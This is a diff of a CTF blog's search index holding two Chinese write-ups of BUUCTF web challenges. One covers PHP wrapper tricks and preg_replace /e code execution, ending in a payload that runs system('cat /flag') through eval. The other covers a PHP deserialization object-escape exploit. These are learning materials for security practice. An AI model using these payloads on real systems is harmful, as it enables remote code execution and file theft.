@@ -1,8 +1,8 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
-    <title>CTF</title>
-    <url>/CTF/index/</url>
+    <title>Pwn</title>
+    <url>/CTF/Pwn/index/</url>
     <content><![CDATA[]]></content>
   </entry>
   <entry>
@@ -33,6 +33,62 @@
 <p><img src="/CTF/Web/BUU-Easy_Java/04.png"></p>
 <p>再访问下载WEB-INF&#x2F;classes&#x2F;com&#x2F;vm&#x2F;ctf&#x2F;FlagController.class</p>
 <p>打开之后发现一串base64编码的字符串，解码得到flag.</p>
+]]></content>
+      <categories>
+        <category>Web</category>
+      </categories>
+      <tags>
+        <tag>Web</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>BUU-ZJCTF,不过如此 - Wp</title>
+    <url>/CTF/Web/BUU-ZJCTF,%E4%B8%8D%E8%BF%87%E5%A6%82%E6%AD%A4/</url>
+    <content><![CDATA[<p><img src="/CTF/Web/BUU-ZJCTF,%E4%B8%8D%E8%BF%87%E5%A6%82%E6%AD%A4/00.png" alt="00"></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">file_get_contents($text,&#x27;r&#x27;)===&quot;I have a dream&quot;</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>1.使用php:&#x2F;&#x2F;input</p>
+<p><strong>php:&#x2F;&#x2F;input</strong>可以访问请求的原始数据的只读流，将post请求的数据当作php代码执行。<strong>当传入的参数作为文件名打开时，可以将参数设为php:&#x2F;&#x2F;input,同时post想设置的文件内容，php执行时会将post内容当作文件内容。从而导致任意代码执行。</strong></p>
+<p><strong>遇到file_get_contents()要想到用php:&#x2F;&#x2F;input绕过。</strong></p>
+</blockquote>
+<p><img src="/CTF/Web/BUU-ZJCTF,%E4%B8%8D%E8%BF%87%E5%A6%82%E6%AD%A4/01.png" alt="01"></p>
+<blockquote>
+<p>2.使用data协议</p>
+<p>数据流封装器，以传递相应格式的数据。可以让用户来控制输入流，<strong>当它与包含函数结合时，用户输入的data:&#x2F;&#x2F;流会被当作php文件执行</strong></p>
+</blockquote>
+<p><img src="/CTF/Web/BUU-ZJCTF,%E4%B8%8D%E8%BF%87%E5%A6%82%E6%AD%A4/02.png" alt="02"></p>
+<p>next.php的内容</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$id</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;id&#x27;</span>];</span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&#x27;id&#x27;</span>] = <span class="variable">$id</span>;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">complex</span>(<span class="params"><span class="variable">$re</span>, <span class="variable">$str</span></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">preg_replace</span>(</span><br><span class="line">        <span class="string">&#x27;/(&#x27;</span> . <span class="variable">$re</span> . <span class="string">&#x27;)/ei&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;strtolower(&quot;\\1&quot;)&#x27;</span>,</span><br><span class="line">        <span class="variable">$str</span></span><br><span class="line">    );</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">foreach</span>(<span class="variable">$_GET</span> <span class="keyword">as</span> <span class="variable">$re</span> =&gt; <span class="variable">$str</span>) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">complex</span>(<span class="variable">$re</span>, <span class="variable">$str</span>). <span class="string">&quot;\n&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getFlag</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">	@<span class="keyword">eval</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+<p><strong>1.preg_replace()的&#x2F;e模式存在命令执行漏洞		&#x2F;e -&gt; 可执行模式，此为PHP专有参数，例如preg_replace函数.</strong></p>
+<p><strong>知识学习</strong>（低版本php存在，新版本的php已经启用&#x2F;e）</p>
+<p><a href="https://xz.aliyun.com/t/2557">https://xz.aliyun.com/t/2557</a></p>
+<p><a href="https://blog.csdn.net/qq_20408491/article/details/75095055">https://blog.csdn.net/qq_20408491/article/details/75095055</a></p>
+<blockquote>
+<p> <strong>preg_replace</strong> 函数在匹配到符号正则的字符串时，会将替换字符串（也就是上图 <strong>preg_replace</strong> 函数的第二个参数）当做代码来执行，然而这里的第二个参数却固定为 <strong>‘strtolower(“\1”)’</strong> 字符串，那这样要如何执行代码呢？</p>
+<p><strong>replacement</strong>可以包含\n形式或$n形式的逆向引用，n可以为0到99，\n表示匹配pattern第n个子模式的文本，\0表示匹配整个pattern的文本</p>
+</blockquote>
+<p><strong><code>\1</code> 在正则表达式中有自己的含义，</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">反向引用</span><br><span class="line"></span><br><span class="line">对一个正则表达式模式或部分模式 两边添加圆括号 将导致相关 匹配存储到一个临时缓冲区 中，所捕获的每个子匹配都按照在正则表达式模式中从左到右出现的顺序存储。缓冲区编号从 1 开始，最多可存储 99 个捕获的子表达式。每个缓冲区都可以使用 &#x27;\n&#x27; 访问，其中 n 为一个标识特定缓冲区的一位或两位十进制数</span><br><span class="line"></span><br><span class="line">这里的 \1 实际上是匹配第一个子匹配项,我们拿 ripstech 官方给的 payload 进行分析，方便大家理解。官方 payload 为： /?.*=&#123;$&#123;phpinfo()&#125;&#125; ，即 GET 方式传入的参数名为 /?.* ，值为 &#123;$&#123;phpinfo()&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">原先的语句： preg_replace(&#x27;/(&#x27; . $re . &#x27;)/ei&#x27;, &#x27;strtolower(&quot;\\1&quot;)&#x27;, $str);</span><br><span class="line">变成了语句： preg_replace(&#x27;/(.*)/ei&#x27;, &#x27;strtolower(&quot;\\1&quot;)&#x27;, &#123;$&#123;phpinfo()&#125;&#125;);</span><br></pre></td></tr></table></figure>
+
+<p><strong>2.此处由GET方法传入值，而GET方法传参时 -&gt; 当首字母为点号时，会被替换为下划线.</strong></p>
+<blockquote>
+<p><strong>\S*&#x3D;${phpinfo()}</strong></p>
+<p>\S 匹配任何非空白字符</p>
+</blockquote>
+<p><strong>3.PHP可变变量</strong></p>
+<p><code>payload \S\*=$&#123;phpinfo()&#125;</code></p>
+<blockquote>
+<p>在PHP中双引号包裹的字符串中可以解析变量，而单引号则不行。 <strong>${phpinfo()}</strong> 中的 <strong>phpinfo()</strong> 会被当做变量先执行，执行后，即变成 <strong>${1}</strong> (phpinfo()成功执行返回true)</p>
+</blockquote>
+<p>payload: <code>/?text=data://text/pain,I have a dream&amp;file=next.php&amp;\S*=$&#123;getFlag()&#125;&amp;cmd=system(&#39;cat /flag&#39;);</code></p>
 ]]></content>
       <categories>
         <category>Web</category>
@@ -152,53 +208,61 @@
       </tags>
   </entry>
   <entry>
-    <title>BUU-ZJCTF,不过如此 - Wp</title>
-    <url>/CTF/Web/BUU-ZJCTF,%E4%B8%8D%E8%BF%87%E5%A6%82%E6%AD%A4/</url>
-    <content><![CDATA[<p><img src="/CTF/Web/BUU-ZJCTF,%E4%B8%8D%E8%BF%87%E5%A6%82%E6%AD%A4/00.png" alt="00"></p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">file_get_contents($text,&#x27;r&#x27;)===&quot;I have a dream&quot;</span><br></pre></td></tr></table></figure>
+    <title>BUU-easy_serialize_php的Wp</title>
+    <url>/CTF/Web/BUU-easy_serialize_php/</url>
+    <content><![CDATA[<blockquote>
+<p>1.代码审计</p>
+<p>2.PHP反序列化</p>
+<p>3.反序列化中的对象逃逸</p>
+</blockquote>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$function</span> = @<span class="variable">$_GET</span>[<span class="string">&#x27;f&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$function</span> == <span class="string">&#x27;highlight_file&#x27;</span>)&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="string">&#x27;index.php&#x27;</span>);</span><br><span class="line">&#125;<span class="keyword">else</span> <span class="keyword">if</span>(<span class="variable">$function</span> == <span class="string">&#x27;phpinfo&#x27;</span>)&#123;</span><br><span class="line">    <span class="keyword">eval</span>(<span class="string">&#x27;phpinfo();&#x27;</span>); <span class="comment">//maybe you can find something in here!</span></span><br><span class="line">&#125;<span class="keyword">else</span> <span class="keyword">if</span>(<span class="variable">$function</span> == <span class="string">&#x27;show_image&#x27;</span>)&#123;</span><br><span class="line">    <span class="variable">$userinfo</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$serialize_info</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="title function_ invoke__">base64_decode</span>(<span class="variable">$userinfo</span>[<span class="string">&#x27;img&#x27;</span>]));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
 <blockquote>
-<p>1.使用php:&#x2F;&#x2F;input</p>
-<p><strong>php:&#x2F;&#x2F;input</strong>可以访问请求的原始数据的只读流，将post请求的数据当作php代码执行。<strong>当传入的参数作为文件名打开时，可以将参数设为php:&#x2F;&#x2F;input,同时post想设置的文件内容，php执行时会将post内容当作文件内容。从而导致任意代码执行。</strong></p>
-<p><strong>遇到file_get_contents()要想到用php:&#x2F;&#x2F;input绕过。</strong></p>
+<p>$function 变量 通过GET传f变量得到   &#x3D;&gt; 不同的值，对应不同的页面</p>
+<p> -&gt; 当f传入phpinfo , 可以得到提示 &#x3D;&gt; 一个文件的名字 d0g3_f1ag.php</p>
+<p> -&gt;当f传入show_image的时候存在file_get_contents函数 &#x3D;&gt; 可以读取文件内容</p>
 </blockquote>
-<p><img src="/CTF/Web/BUU-ZJCTF,%E4%B8%8D%E8%BF%87%E5%A6%82%E6%AD%A4/01.png" alt="01"></p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filter</span>(<span class="params"><span class="variable">$img</span></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$filter_arr</span> = <span class="keyword">array</span>(<span class="string">&#x27;php&#x27;</span>,<span class="string">&#x27;flag&#x27;</span>,<span class="string">&#x27;php5&#x27;</span>,<span class="string">&#x27;php4&#x27;</span>,<span class="string">&#x27;fl1g&#x27;</span>);</span><br><span class="line">    <span class="variable">$filter</span> = <span class="string">&#x27;/&#x27;</span>.<span class="title function_ invoke__">implode</span>(<span class="string">&#x27;|&#x27;</span>,<span class="variable">$filter_arr</span>).<span class="string">&#x27;/i&#x27;</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">preg_replace</span>(<span class="variable">$filter</span>,<span class="string">&#x27;&#x27;</span>,<span class="variable">$img</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
 <blockquote>
-<p>2.使用data协议</p>
-<p>数据流封装器，以传递相应格式的数据。可以让用户来控制输入流，<strong>当它与包含函数结合时，用户输入的data:&#x2F;&#x2F;流会被当作php文件执行</strong></p>
+<p>filter函数 &#x3D;&gt;过滤函数, 将一系列黑名单替换为空 &#x3D;&gt; 将$img变量中存在黑名单的内容替换为空</p>
 </blockquote>
-<p><img src="/CTF/Web/BUU-ZJCTF,%E4%B8%8D%E8%BF%87%E5%A6%82%E6%AD%A4/02.png" alt="02"></p>
-<p>next.php的内容</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$id</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;id&#x27;</span>];</span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&#x27;id&#x27;</span>] = <span class="variable">$id</span>;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">complex</span>(<span class="params"><span class="variable">$re</span>, <span class="variable">$str</span></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">preg_replace</span>(</span><br><span class="line">        <span class="string">&#x27;/(&#x27;</span> . <span class="variable">$re</span> . <span class="string">&#x27;)/ei&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;strtolower(&quot;\\1&quot;)&#x27;</span>,</span><br><span class="line">        <span class="variable">$str</span></span><br><span class="line">    );</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">foreach</span>(<span class="variable">$_GET</span> <span class="keyword">as</span> <span class="variable">$re</span> =&gt; <span class="variable">$str</span>) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">complex</span>(<span class="variable">$re</span>, <span class="variable">$str</span>). <span class="string">&quot;\n&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getFlag</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">	@<span class="keyword">eval</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>-&gt; 以及serialize和unserialize两个序列化函数，想到键值对的逃逸</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">extract</span>(<span class="variable">$_POST</span>);</span><br><span class="line"><span class="comment">// 以POST方法传入参数 =&gt; extract函数的作用是将post方法传入的键值对，以变量的形式返回</span></span><br><span class="line"><span class="variable">$serialize_info</span> = <span class="title function_ invoke__">filter</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$_SESSION</span>));</span><br><span class="line"><span class="comment">// 将$_SESSION序列化后进行filter进行过滤，然后赋值给 $serialize_info变量</span></span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span>(<span class="variable">$function</span> == <span class="string">&#x27;show_image&#x27;</span>)&#123;</span><br><span class="line">    <span class="variable">$userinfo</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$serialize_info</span>); <span class="comment">// 将$serialize_info变量进行反序列化</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="title function_ invoke__">base64_decode</span>(<span class="variable">$userinfo</span>[<span class="string">&#x27;img&#x27;</span>]));</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 将$userinfo变量数组中img的值进行base64解码后进行文件的读取</span></span><br></pre></td></tr></table></figure>
 
+<p><img src="/CTF/Web/BUU-easy_serialize_php/test00.png"></p>
+<hr>
+<p><strong>如何去构造一个字符串逃逸</strong></p>
+<hr>
+<p><strong>1.键名逃逸</strong></p>
+<p>如何传入$_SESSION[phpflag] 序列化之后</p>
+<p>-&gt; s:7:”phpflag”:s:48:”” &#x3D;&gt; s:7:”<code>&quot;:s:48:&quot;</code>;”</p>
+<p>-&gt; 48是 传入phpflag的值的长度（即, $img对应的值）</p>
+<p>-&gt; 最后要进行序列化的闭合 <code>;&#125;</code></p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&#x27;img&#x27;</span>] = <span class="string">&quot;ZDBnM19mMWFnLnBocA==&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$_SESSION</span>);</span><br><span class="line"><span class="comment">// s:3:&quot;img&quot;;s:20:&quot;ZDBnM19mMWFnLnBocA==&quot;;&#125;</span></span><br></pre></td></tr></table></figure>
 
+<p>结合起来</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&#x27;phpflag&#x27;</span>]=<span class="string">&quot;;s:1:\&quot;1\&quot;;s:3:\&quot;img\&quot;;s:20:\&quot;ZDBnM19mMWFnLnBocA==\&quot;;&#125;&quot;</span>;</span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&#x27;img&#x27;</span>] = <span class="title function_ invoke__">base64_encode</span>(<span class="string">&#x27;guest_img.png&#x27;</span>);</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>( <span class="title function_ invoke__">serialize</span>(<span class="variable">$_SESSION</span>) );</span><br><span class="line"><span class="comment">// &quot;a:2:&#123;s:7:&quot;phpflag&quot;;s:48:&quot;;s:1:&quot;1&quot;;s:3:&quot;img&quot;;s:20:&quot;ZDBnM19mMWFnLnBocA==&quot;;&#125;&quot;;s:3:&quot;img&quot;;s:20:&quot;Z3Vlc3RfaW1nLnBuZw==&quot;;&#125;&quot;</span></span><br><span class="line"><span class="comment">// &quot;a:2:&#123;s:7:&quot;&quot;;s:48:&quot;;s:1:&quot;1&quot;;s:3:&quot;img&quot;;s:20:&quot;ZDBnM19mMWFnLnBocA==&quot;;&#125;&quot;;s:3:&quot;img&quot;;s:20:&quot;Z3Vlc3RfaW1nLnBuZw==&quot;;&#125;&quot;</span></span><br></pre></td></tr></table></figure>
 
-
-
-<p><strong>1.preg_replace()的&#x2F;e模式存在命令执行漏洞		&#x2F;e -&gt; 可执行模式，此为PHP专有参数，例如preg_replace函数.</strong></p>
-<p><strong>知识学习</strong>（低版本php存在，新版本的php已经启用&#x2F;e）</p>
-<p><a href="https://xz.aliyun.com/t/2557">https://xz.aliyun.com/t/2557</a></p>
-<p><a href="https://blog.csdn.net/qq_20408491/article/details/75095055">https://blog.csdn.net/qq_20408491/article/details/75095055</a></p>
 <blockquote>
-<p> <strong>preg_replace</strong> 函数在匹配到符号正则的字符串时，会将替换字符串（也就是上图 <strong>preg_replace</strong> 函数的第二个参数）当做代码来执行，然而这里的第二个参数却固定为 <strong>‘strtolower(“\1”)’</strong> 字符串，那这样要如何执行代码呢？</p>
-<p><strong>replacement</strong>可以包含\n形式或$n形式的逆向引用，n可以为0到99，\n表示匹配pattern第n个子模式的文本，\0表示匹配整个pattern的文本</p>
+<p>逃逸成了 </p>
+<p>“;s:48: 的变量名对应的值为1 </p>
+<p>​	-&gt; 注意的点<code>&quot;;s:</code>肯定有，48:是后面的值的长度</p>
+<p>​	-&gt; 第二个”是传入的值的前引号</p>
+<p>​	-&gt;我们需要自己构造的是闭合这个名字 <code>;</code></p>
+<p>img的变量名对应的值对 base64_encode(d0g3_f1ag.php)</p>
+<p>​	-&gt; 注意的点，闭合这个序列化 ;}</p>
 </blockquote>
-<p><strong><code>\1</code> 在正则表达式中有自己的含义，</strong></p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">反向引用</span><br><span class="line"></span><br><span class="line">对一个正则表达式模式或部分模式 两边添加圆括号 将导致相关 匹配存储到一个临时缓冲区 中，所捕获的每个子匹配都按照在正则表达式模式中从左到右出现的顺序存储。缓冲区编号从 1 开始，最多可存储 99 个捕获的子表达式。每个缓冲区都可以使用 &#x27;\n&#x27; 访问，其中 n 为一个标识特定缓冲区的一位或两位十进制数</span><br><span class="line"></span><br><span class="line">这里的 \1 实际上是匹配第一个子匹配项,我们拿 ripstech 官方给的 payload 进行分析，方便大家理解。官方 payload 为： /?.*=&#123;$&#123;phpinfo()&#125;&#125; ，即 GET 方式传入的参数名为 /?.* ，值为 &#123;$&#123;phpinfo()&#125;&#125;</span><br></pre></td></tr></table></figure>
+<p><strong>2.键值逃逸</strong></p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&#x27;user&#x27;</span>] = <span class="string">&quot;flagflagflagflagflagphp&quot;</span>;</span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&#x27;function&#x27;</span>] = <span class="string">&quot;;s:3:\&quot;img\&quot;;s:20:\&quot;ZDBnM19mMWFnLnBocA==\&quot;;&#125;&quot;</span>;</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>( <span class="title function_ invoke__">serialize</span>(<span class="variable">$_SESSION</span>) );</span><br><span class="line"><span class="comment">// &quot;a:2:&#123;s:4:&quot;user&quot;;s:23:&quot;flagflagflagflagflagphp&quot;;s:8:&quot;function&quot;;s:40:&quot;;s:3:&quot;img&quot;;s:20:&quot;ZDBnM19mMWFnLnBocA==&quot;;&#125;&quot;;&#125;&quot;</span></span><br></pre></td></tr></table></figure>
 
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">原先的语句： preg_replace(&#x27;/(&#x27; . $re . &#x27;)/ei&#x27;, &#x27;strtolower(&quot;\\1&quot;)&#x27;, $str);</span><br><span class="line">变成了语句： preg_replace(&#x27;/(.*)/ei&#x27;, &#x27;strtolower(&quot;\\1&quot;)&#x27;, &#123;$&#123;phpinfo()&#125;&#125;);</span><br></pre></td></tr></table></figure>
-
-<p><strong>2.此处由GET方法传入值，而GET方法传参时 -&gt; 当首字母为点号时，会被替换为下划线.</strong></p>
 <blockquote>
-<p><strong>\S*&#x3D;${phpinfo()}</strong></p>
-<p>\S 匹配任何非空白字符</p>
+<p>先将自己要写入的代码放进去 也就是$function的值</p>
+<p>-&gt;通过测试，一步步调整 user中的值 来闭合</p>
 </blockquote>
-<p><strong>3.PHP可变变量</strong></p>
-<p><code>payload \S\*=$&#123;phpinfo()&#125;</code></p>
-<blockquote>
-<p>在PHP中双引号包裹的字符串中可以解析变量，而单引号则不行。 <strong>${phpinfo()}</strong> 中的 <strong>phpinfo()</strong> 会被当做变量先执行，执行后，即变成 <strong>${1}</strong> (phpinfo()成功执行返回true)</p>
-</blockquote>
-<p>payload: <code>/?text=data://text/pain,I have a dream&amp;file=next.php&amp;\S*=$&#123;getFlag()&#125;&amp;cmd=system(&#39;cat /flag&#39;);</code></p>
+<p><code>&quot;a:2:&#123;s:4:&quot;user&quot;;s:23:&quot;flagflagflagflagflagphp&quot;;s:8:&quot;function&quot;;s:40:&quot;;s:3:&quot;img&quot;;s:20:&quot;ZDBnM19mMWFnLnBocA==&quot;;&#125;&quot;;&#125;&quot;</code></p>
+<p><code>&quot;;s:8:&quot;function&quot;;s:40:&quot;</code> -&gt;这是23的长度，我们传入function中的值，开始要有一个”和; 来闭合前面user的值</p>
+<p><strong>payload:_SESSION[user]&#x3D;flagflagflagflagflagphp&amp;_SESSION[function]&#x3D;”;s:3:”img”;s:20:”ZDBnM19mMWFnLnBocA&#x3D;&#x3D;”;s:1:”1”;s:1:”2”;}</strong></p>
 ]]></content>
       <categories>
         <category>Web</category>
@@ -276,70 +340,6 @@
       </tags>
   </entry>
   <entry>
-    <title>BUU-easy_serialize_php的Wp</title>
-    <url>/CTF/Web/BUU-easy_serialize_php/</url>
-    <content><![CDATA[<blockquote>
-<p>1.代码审计</p>
-<p>2.PHP反序列化</p>
-<p>3.反序列化中的对象逃逸</p>
-</blockquote>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$function</span> = @<span class="variable">$_GET</span>[<span class="string">&#x27;f&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$function</span> == <span class="string">&#x27;highlight_file&#x27;</span>)&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="string">&#x27;index.php&#x27;</span>);</span><br><span class="line">&#125;<span class="keyword">else</span> <span class="keyword">if</span>(<span class="variable">$function</span> == <span class="string">&#x27;phpinfo&#x27;</span>)&#123;</span><br><span class="line">    <span class="keyword">eval</span>(<span class="string">&#x27;phpinfo();&#x27;</span>); <span class="comment">//maybe you can find something in here!</span></span><br><span class="line">&#125;<span class="keyword">else</span> <span class="keyword">if</span>(<span class="variable">$function</span> == <span class="string">&#x27;show_image&#x27;</span>)&#123;</span><br><span class="line">    <span class="variable">$userinfo</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$serialize_info</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="title function_ invoke__">base64_decode</span>(<span class="variable">$userinfo</span>[<span class="string">&#x27;img&#x27;</span>]));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<blockquote>
-<p>$function 变量 通过GET传f变量得到   &#x3D;&gt; 不同的值，对应不同的页面</p>
-<p> -&gt; 当f传入phpinfo , 可以得到提示 &#x3D;&gt; 一个文件的名字 d0g3_f1ag.php</p>
-<p> -&gt;当f传入show_image的时候存在file_get_contents函数 &#x3D;&gt; 可以读取文件内容</p>
-</blockquote>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filter</span>(<span class="params"><span class="variable">$img</span></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$filter_arr</span> = <span class="keyword">array</span>(<span class="string">&#x27;php&#x27;</span>,<span class="string">&#x27;flag&#x27;</span>,<span class="string">&#x27;php5&#x27;</span>,<span class="string">&#x27;php4&#x27;</span>,<span class="string">&#x27;fl1g&#x27;</span>);</span><br><span class="line">    <span class="variable">$filter</span> = <span class="string">&#x27;/&#x27;</span>.<span class="title function_ invoke__">implode</span>(<span class="string">&#x27;|&#x27;</span>,<span class="variable">$filter_arr</span>).<span class="string">&#x27;/i&#x27;</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">preg_replace</span>(<span class="variable">$filter</span>,<span class="string">&#x27;&#x27;</span>,<span class="variable">$img</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<blockquote>
-<p>filter函数 &#x3D;&gt;过滤函数, 将一系列黑名单替换为空 &#x3D;&gt; 将$img变量中存在黑名单的内容替换为空</p>
-</blockquote>
-<p>-&gt; 以及serialize和unserialize两个序列化函数，想到键值对的逃逸</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">extract</span>(<span class="variable">$_POST</span>);</span><br><span class="line"><span class="comment">// 以POST方法传入参数 =&gt; extract函数的作用是将post方法传入的键值对，以变量的形式返回</span></span><br><span class="line"><span class="variable">$serialize_info</span> = <span class="title function_ invoke__">filter</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$_SESSION</span>));</span><br><span class="line"><span class="comment">// 将$_SESSION序列化后进行filter进行过滤，然后赋值给 $serialize_info变量</span></span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span>(<span class="variable">$function</span> == <span class="string">&#x27;show_image&#x27;</span>)&#123;</span><br><span class="line">    <span class="variable">$userinfo</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$serialize_info</span>); <span class="comment">// 将$serialize_info变量进行反序列化</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="title function_ invoke__">base64_decode</span>(<span class="variable">$userinfo</span>[<span class="string">&#x27;img&#x27;</span>]));</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 将$userinfo变量数组中img的值进行base64解码后进行文件的读取</span></span><br></pre></td></tr></table></figure>
-
-<p><img src="/CTF/Web/BUU-easy_serialize_php/test00.png"></p>
-<hr>
-<p><strong>如何去构造一个字符串逃逸</strong></p>
-<hr>
-<p><strong>1.键名逃逸</strong></p>
-<p>如何传入$_SESSION[phpflag] 序列化之后</p>
-<p>-&gt; s:7:”phpflag”:s:48:”” &#x3D;&gt; s:7:”<code>&quot;:s:48:&quot;</code>;”</p>
-<p>-&gt; 48是 传入phpflag的值的长度（即, $img对应的值）</p>
-<p>-&gt; 最后要进行序列化的闭合 <code>;&#125;</code></p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&#x27;img&#x27;</span>] = <span class="string">&quot;ZDBnM19mMWFnLnBocA==&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$_SESSION</span>);</span><br><span class="line"><span class="comment">// s:3:&quot;img&quot;;s:20:&quot;ZDBnM19mMWFnLnBocA==&quot;;&#125;</span></span><br></pre></td></tr></table></figure>
-
-<p>结合起来</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&#x27;phpflag&#x27;</span>]=<span class="string">&quot;;s:1:\&quot;1\&quot;;s:3:\&quot;img\&quot;;s:20:\&quot;ZDBnM19mMWFnLnBocA==\&quot;;&#125;&quot;</span>;</span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&#x27;img&#x27;</span>] = <span class="title function_ invoke__">base64_encode</span>(<span class="string">&#x27;guest_img.png&#x27;</span>);</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>( <span class="title function_ invoke__">serialize</span>(<span class="variable">$_SESSION</span>) );</span><br><span class="line"><span class="comment">// &quot;a:2:&#123;s:7:&quot;phpflag&quot;;s:48:&quot;;s:1:&quot;1&quot;;s:3:&quot;img&quot;;s:20:&quot;ZDBnM19mMWFnLnBocA==&quot;;&#125;&quot;;s:3:&quot;img&quot;;s:20:&quot;Z3Vlc3RfaW1nLnBuZw==&quot;;&#125;&quot;</span></span><br><span class="line"><span class="comment">// &quot;a:2:&#123;s:7:&quot;&quot;;s:48:&quot;;s:1:&quot;1&quot;;s:3:&quot;img&quot;;s:20:&quot;ZDBnM19mMWFnLnBocA==&quot;;&#125;&quot;;s:3:&quot;img&quot;;s:20:&quot;Z3Vlc3RfaW1nLnBuZw==&quot;;&#125;&quot;</span></span><br></pre></td></tr></table></figure>
-
-<blockquote>
-<p>逃逸成了 </p>
-<p>“;s:48: 的变量名对应的值为1 </p>
-<p>​	-&gt; 注意的点<code>&quot;;s:</code>肯定有，48:是后面的值的长度</p>
-<p>​	-&gt; 第二个”是传入的值的前引号</p>
-<p>​	-&gt;我们需要自己构造的是闭合这个名字 <code>;</code></p>
-<p>img的变量名对应的值对 base64_encode(d0g3_f1ag.php)</p>
-<p>​	-&gt; 注意的点，闭合这个序列化 ;}</p>
-</blockquote>
